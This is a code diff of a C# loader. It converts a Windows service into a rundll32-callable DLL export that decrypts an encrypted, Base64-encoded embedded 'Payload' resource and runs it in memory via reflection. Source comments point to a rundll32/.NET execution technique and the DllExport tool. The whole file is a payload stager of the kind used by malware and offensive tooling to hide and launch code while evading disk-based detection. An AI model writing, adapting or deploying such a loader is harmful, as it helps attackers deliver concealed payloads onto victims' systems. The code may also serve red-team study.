@@ -1,25 +1,17 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Diagnostics;
 using System.Linq;
-using System.Security.Cryptography;
-using System.ServiceProcess;
 using System.Text;
 using System.Threading.Tasks;
 using System.Reflection;
-using System.Threading;
+using System.Security.Cryptography;
 
-namespace Service
+namespace Library
 {
-    public partial class Service : ServiceBase
+    //https://blog.xpnsec.com/rundll32-your-dotnet/
+    //https://github.com/3F/DllExport
+    public class Entry
     {
-        public Service()
-        {
-            InitializeComponent();
-        }
-
         private static RijndaelManaged encoder;
         private static void InitDecoder()
         {
@@ -45,36 +37,27 @@ namespace Service
             return decryptedBytes;
         }
 
-        protected override void OnStart(string[] args)
-        {
-            Thread t = new Thread(new ThreadStart(Execute));
-            t.Start();
-            
-        }
 
-        public static void Execute()
+        [DllExport]
+        public static void Start()
         {
-            //System.IO.File.AppendAllLines(@"c:\users\public\log.txt", new string[] { "OnStart" });
-            //try
-            //{
+#if DEBUG
+            Console.WriteLine("Running Decoder.");
+#endif
+
+
 
             InitDecoder();
             var b64 = Encoding.UTF8.GetString(Properties.Resources.Payload);
             var asm = Decrypt(Convert.FromBase64String(b64));
 
-            var assembly = Assembly.Load(asm);
+            var assembly = System.Reflection.Assembly.Load(asm);
             var method = assembly.GetTypes().First(t => t.Name ==  "Entry").GetMethod("Start", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
             method.Invoke(null, new object[] { });
-            //}
-            //catch(Exception ex)
-            //{
-            //    System.IO.File.AppendAllLines(@"c:\users\public\log.txt", new string[] { ex.ToString() });
-            //}
+
+            //var assembly = System.Reflection.Assembly.Load(asm);
+            //assembly.EntryPoint.Invoke(null, new object[] { new string[] { } });
         }
 
-        protected override void OnStop()
-        {
-            Environment.Exit(0);
-        }
     }
 }
